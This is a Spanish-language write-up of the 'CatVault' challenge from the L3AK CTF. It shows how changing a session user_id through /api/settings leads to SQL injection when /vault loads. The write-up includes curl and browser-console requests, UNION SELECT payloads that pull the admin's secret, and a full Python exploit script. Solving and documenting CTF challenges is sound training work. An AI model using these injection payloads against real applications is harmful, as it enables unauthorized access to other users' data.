# CatVault — L3AK CTF Writeup

## Introducción

El objetivo del challenge **CatVault** es acceder al secreto almacenado por el usuario administrador y recuperar la flag.

La aplicación permite registrarse, iniciar sesión y guardar secretos dentro de una bóveda personal. La vulnerabilidad aparece porque el valor `user_id` de la sesión puede modificarse mediante el endpoint `/api/settings` y luego es utilizado de forma insegura al consultar los secretos de la bóveda.

La explotación se basa en encadenar dos comportamientos:

1. **Manipulación del `user_id` almacenado en la sesión** mediante `/api/settings`.
2. **SQL Injection con `UNION SELECT`** al cargar `/vault`.

La cadena de ataque permite reemplazar el identificador numérico del usuario por una expresión SQL que recupera el contenido almacenado por el administrador.

> **Challenge:** `web / catvault`  
> **Vulnerabilidad principal:** SQL Injection  
> **Objetivo:** obtener el secreto del usuario con `user_id = 1`

---

# 1. Reconocimiento

Al acceder a la aplicación encontramos un formulario de registro y autenticación.

![Formulario de registro de CatVault](images/01-registro.png)

Después de crear una cuenta e iniciar sesión, la aplicación muestra una bóveda personal con dos funcionalidades:

- guardar un nuevo secreto;
- visualizar los secretos asociados al usuario autenticado.

![Bóveda del usuario de prueba](images/04-vault-inicial.png)

La aplicación identifica qué secretos mostrar utilizando un dato de la sesión. Existe el endpoint:

```text
POST /api/settings
```

que acepta un JSON con el campo:

```json
{
  "user_id": "..."
}
```

El dato resulta especialmente interesante porque determina qué usuario se utiliza posteriormente al consultar la bóveda.

---

# 2. Cadena de ataque

La explotación completa se puede resumir en los siguientes pasos:

1. Registrar una cuenta e iniciar sesión.
2. Identificar el endpoint `POST /api/settings`.
3. Enviar como `user_id` un payload SQL controlado.
4. Conseguir que el servidor guarde ese valor dentro de una nueva cookie de sesión.
5. Acceder nuevamente a `/vault` utilizando la cookie actualizada.
6. Hacer que la consulta original no devuelva filas mediante `user_id = 0`.
7. Agregar un `UNION SELECT` que recupere el contenido del usuario administrador.
8. Extraer la flag de la respuesta HTML.

---

# 3. Registro y autenticación

Primero creamos un usuario cualquiera. En este caso utilizamos:

```text
Usuario: test
Contraseña: test
```

Luego iniciamos sesión para obtener una cookie válida y acceder a la bóveda.

Este paso es necesario porque `/api/settings` modifica información perteneciente a la sesión actual. Sin una sesión autenticada, el servidor no tendría el contexto del usuario que estamos intentando alterar.

En el script ambas operaciones se realizan con:

```python
s.post(
    f"{BASE_URL}/register",
    data={"username": "test", "password": "test"}
)

s.post(
    f"{BASE_URL}/login",
    data={"username": "test", "password": "test"}
)
```

La variable `s` es un objeto `requests.Session`, por lo que conserva automáticamente las cookies recibidas durante el registro y el inicio de sesión.

---

# 4. Manipulación de la sesión mediante `/api/settings`

La aplicación permite modificar el `user_id` mediante:

```http
POST /api/settings HTTP/1.1
Content-Type: application/json
Cookie: session=...
```

con un body como:

```json
{
  "user_id": "0 UNION SELECT 1, 'INYECCION_EXITOSA'-- -"
}
```

La petición puede enviarse inicialmente con `curl`:

```bash
curl -v -X POST \
  "https://<INSTANCIA>/api/settings" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<COOKIE_ACTUAL>" \
  -d '{"user_id":"0 UNION SELECT 1, '\''INYECCION_EXITOSA'\''-- -"}'
```

El servidor devuelve una respuesta similar a:

```json
{
  "ok": true,
  "saved": {
    "user_id": "0 UNION SELECT 1, 'INYECCION_EXITOSA'-- -"
  }
}
```

Esta respuesta confirma que el endpoint aceptó y almacenó el valor controlado. Sin embargo, por sí sola todavía no demuestra que exista una SQL Injection: la vulnerabilidad se confirma cuando el valor es utilizado al cargar `/vault` y el texto inyectado aparece como si fuera un secreto.

![Petición al endpoint de configuración](images/02-request-settings.png)

---

# 5. Confirmación de la SQL Injection

Para comprobar que el valor de `user_id` termina formando parte de una consulta SQL utilizamos:

```sql
0 UNION SELECT 1, 'INYECCION_EXITOSA'-- -
```

El payload tiene cuatro partes:

```text
0
```

Hace que la condición original busque un usuario inexistente, evitando mezclar nuestros resultados con los secretos de la cuenta autenticada.

```sql
UNION SELECT
```

Permite agregar una fila creada por nosotros al resultado de la consulta original.

```sql
1, 'INYECCION_EXITOSA'
```

Aporta dos columnas compatibles con las que espera la aplicación: un identificador y el contenido que se mostrará como secreto.

```sql
-- -
```

Comenta el resto de la consulta SQL original.

Después de guardar el payload y recargar `/vault`, la aplicación muestra:

```text
INYECCION_EXITOSA
```

![Marcador mostrado dentro de la bóveda](images/07-inyeccion-validada.png)


---

# 6. Actualización de la cookie de sesión

Durante las primeras pruebas con `curl`, el endpoint aceptaba el payload pero al volver al navegador no se observaba ningún cambio.

El motivo es que `/api/settings` modifica un valor de la sesión. Como consecuencia, el servidor genera una nueva cookie y la devuelve en la cabecera:

```http
Set-Cookie: session=...; HttpOnly; Path=/
```

![Nueva cookie enviada mediante Set-Cookie](images/05-set-cookie.png)

La petición realizada con `curl` utilizaba la cookie original del navegador, pero la nueva cookie quedaba solamente en la respuesta de `curl`. El navegador continuaba usando la versión anterior y, por lo tanto, `/vault` no recibía el payload inyectado.

Para simplificar la prueba ejecutamos la petición desde la consola del mismo navegador:

```javascript
fetch("/api/settings", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    user_id: "0 UNION SELECT 1, 'INYECCION_EXITOSA'-- -"
  })
}).then(() => location.reload());
```

Al ser una petición al mismo origen, el navegador:

- adjunta la cookie de sesión actual;
- recibe la respuesta del servidor;
- procesa la cabecera `Set-Cookie`;
- reemplaza la cookie almacenada;
- utiliza la nueva sesión al recargar `/vault`.

![Payload ejecutado desde la consola](images/06-consola-validacion.png)

El script de Python resuelve el mismo problema mediante `requests.Session`, que actualiza y reutiliza automáticamente las cookies entre peticiones.

---

# 7. Construcción del payload final

Una vez confirmada la vulnerabilidad reemplazamos el texto de prueba por una consulta que recupere el secreto del administrador:

```sql
0 UNION SELECT 1, content FROM vault WHERE user_id = 1-- -
```

Conceptualmente, el payload agrega al resultado una fila formada por:

```text
ID:      1
CONTENT: contenido almacenado en vault por el user_id 1
```

El filtro:

```sql
WHERE user_id = 1
```

selecciona los secretos pertenecientes al usuario administrador, que es donde se encuentra la flag.

El payload puede ejecutarse desde la consola con:

```javascript
fetch("/api/settings", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    user_id: "0 UNION SELECT 1, content FROM vault WHERE user_id = 1-- -"
  })
}).then(() => location.reload());
```

![Ejecución del payload final](images/08-consola-payload-final.png)

Después de recargar, la bóveda muestra directamente la flag como uno de los secretos almacenados.

![Flag mostrada dentro de la bóveda](images/09-flag-en-vault.png)

---

# 8. Exploit completo

```python
#!/usr/bin/env python3
"""
Script simplificado para resolver CatVault.
Registra/inicia sesión con test:test, inyecta SQL y obtiene la flag.
"""

import requests
import re

BASE_URL = "https://catvault-1-c96e9b8b5bb1.instances.ctf.l3ak.team"


def solve():
    # Objeto Session conserva las cookies recibidas y las envía automáticamente en las peticiones siguientes
    s = requests.Session()


    # Crear una cuenta de prueba y autenticarse
    s.post(
        f"{BASE_URL}/register",
        data={"username": "test", "password": "test"}
    )

    s.post(
        f"{BASE_URL}/login",
        data={"username": "test", "password": "test"}
    )

    # Inyectar el payload SQL modificando user_id en la sesión
    payload = {
        "user_id": "0 UNION SELECT 1, content FROM vault WHERE user_id = 1-- -"
    }
    s.post(f"{BASE_URL}/api/settings", json=payload)

    # Obtener la página del vault, ahora con el user_id manipualdo en la consulta SQL
    resp = s.get(f"{BASE_URL}/vault")

    # Extraer la flag
    flag_match = re.search(r"L3AK\{[^}]+\}", resp.text)

    if flag_match:
        print(f"Flag: {flag_match.group(0)}")
    else:
        print("No se encontró la flag. Contenido recibido (primeros 800 caracteres):")
        print(resp.text[:800])


if __name__ == "__main__":
    solve()
```

> La URL pertenece a una instancia concreta del challenge. Si la instancia cambia, se debe actualizar el valor de `BASE_URL` antes de ejecutar el script.

---

# 9. Obtención de la flag

Al ejecutar el exploit correctamente, la respuesta de `/vault` contiene:

```text
L3AK{i7_wa5_4_V3rY_3asY_WeB_cha1l3ng3_soRRy_7o_bore_Y0U_all_with_7h3_dUMb_pr373X7_n0W_g0_501V3_7h3_r341_oNe}
```

La flag se envía en la plataforma y el challenge queda marcado como resuelto.

![Envío de la flag en la plataforma](images/10-envio-flag.png)

![Challenge resuelto](images/11-challenge-solved.png)